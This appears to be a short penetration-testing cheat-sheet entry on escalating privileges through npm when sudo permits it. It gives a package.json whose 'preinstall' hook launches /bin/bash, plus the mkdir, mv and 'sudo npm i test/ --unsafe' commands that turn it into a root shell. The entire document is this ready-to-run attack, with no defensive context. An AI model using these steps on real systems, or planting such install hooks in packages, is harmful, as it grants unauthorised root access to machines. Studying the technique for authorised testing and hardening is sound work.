---
title: "npm"
date: 2024-6-26
tags: ["npm", "nodejs", "privesc", "sudo"]
---

---
#### SUDO

Create a 'package.json'

<div>

```json
{
  "name": "root",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

</div>

<br>

<div>

```bash
mkdir test
```

```bash
mv package.json test/
```

```bash
sudo npm i test/ --unsafe
```

</div>

<br>